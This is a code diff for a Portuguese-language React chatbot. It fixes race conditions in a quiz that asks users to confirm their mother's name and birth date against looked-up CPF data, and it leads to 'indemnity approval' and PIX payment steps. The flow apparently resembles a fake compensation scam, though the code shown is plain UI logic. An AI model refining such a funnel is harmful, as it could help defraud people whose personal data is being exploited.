@@ -238,7 +238,10 @@ const Chat = () => {
     }
   };
 
-  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
+const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
+    // Store current step to prevent race conditions
+    const currentQuizType = quizType;
+    
     addUserMessage(<span>{option.text}</span>);
     setQuizOptions([]); // Clear options immediately after selection
     
@@ -253,11 +256,14 @@ const Chat = () => {
         true, 20
       );
 
-      if (quizType === "mae") {
+      if (currentQuizType === "mae") {
         await delay(1500);
         await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>, true, 30);
-        setQuizOptions(generateFakeOptions(cpfData?.dataNascimento || "", "nascimento"));
+        const newOptions = generateFakeOptions(cpfData?.dataNascimento || "", "nascimento");
         setStep("quiz-nascimento");
+        // Small delay to ensure step is set before showing options
+        await delay(100);
+        setQuizOptions(newOptions);
       } else {
         await delay(1000);
         await addBotMessage(
@@ -273,13 +279,14 @@ const Chat = () => {
         await showComprovante();
       }
     } else {
-      await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Por favor, tente novamente.</span>, true, 40);
-      // Regenerate options for retry
-      if (quizType === "mae") {
-        setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
-      } else {
-        setQuizOptions(generateFakeOptions(cpfData?.dataNascimento || "", "nascimento"));
-      }
+      await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Tente novamente:</span>, true, 40);
+      // Keep same step but regenerate options after a small delay
+      await delay(300);
+      const retryOptions = generateFakeOptions(
+        currentQuizType === "mae" ? (cpfData?.nomeMae || "") : (cpfData?.dataNascimento || ""),
+        currentQuizType
+      );
+      setQuizOptions(retryOptions);
     }
   };
 
@@ -789,19 +796,29 @@ const Chat = () => {
             </div>
           )}
 
-          {/* Action Buttons */}
-          {!showVideo && (
-            <div className="flex flex-wrap gap-2 justify-center py-3">
-              {/* Quiz Options */}
-              {(step === "quiz-mae" || step === "quiz-nascimento") && quizOptions.length > 0 && quizOptions.map((option, index) => (
-                <Button
-                  key={index}
-                  onClick={() => handleQuizAnswer(option, step === "quiz-mae" ? "mae" : "nascimento")}
-                  className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
-                >
-                  {option.text}
-                </Button>
-              ))}
+{/* Action Buttons */}
+              {!showVideo && (
+                <div className="flex flex-wrap gap-2 justify-center py-3">
+                  {/* Quiz Options - Only show for current quiz step with options */}
+                  {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => (
+                    <Button
+                      key={`mae-${index}-${option.text}`}
+                      onClick={() => handleQuizAnswer(option, "mae")}
+                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
+                    >
+                      {option.text}
+                    </Button>
+                  ))}
+                  
+                  {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => (
+                    <Button
+                      key={`nasc-${index}-${option.text}`}
+                      onClick={() => handleQuizAnswer(option, "nascimento")}
+                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
+                    >
+                      {option.text}
+                    </Button>
+                  ))}
 
               {step === "pix-selection" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
                 <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
@@ -934,12 +951,14 @@ const Chat = () => {
 };
 
 // Helper Components
-const DataRow = ({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) => (
-  <div className="flex justify-between p-3 bg-white/50">
-    <span className="text-sm text-muted-foreground">{label}</span>
-    <span className={`text-sm font-bold ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
-  </div>
-);
+const DataRow = ({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) => {
+  return (
+    <div className="flex justify-between p-3 bg-card">
+      <span className="text-sm text-muted-foreground font-medium">{label}</span>
+      <span className={`text-sm font-bold text-right ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
+    </div>
+  );
+};
 
 const StepDot = ({ completed }: { completed: boolean }) => (
   <div className={`w-8 h-8 rounded-full flex items-center justify-center ${completed ? 'bg-gradient-to-br from-primary to-amber-400' : 'bg-muted'}`}>
